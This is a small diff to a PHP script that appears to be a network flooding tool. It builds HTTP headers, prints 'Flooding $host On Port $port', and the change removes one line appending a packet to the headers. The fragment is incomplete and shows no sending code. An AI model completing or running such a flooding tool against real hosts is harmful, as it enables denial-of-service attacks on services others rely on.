@@ -18,7 +18,6 @@ $headers.="Accept: text/html,application/xhtml+xml,application/xml\r\n";
 $headers.="Accept-Language: en-US\r\n";
 $headers.="Accept-Encoding: gzip, deflate\r\n";
 $headers.="Connection: close\r\n\r\n";
-$headers.=$packet;
 
 if(!empty($host) && !empty($port) && !empty($buffer)) {
     echo "Flooding $host On Port $port";
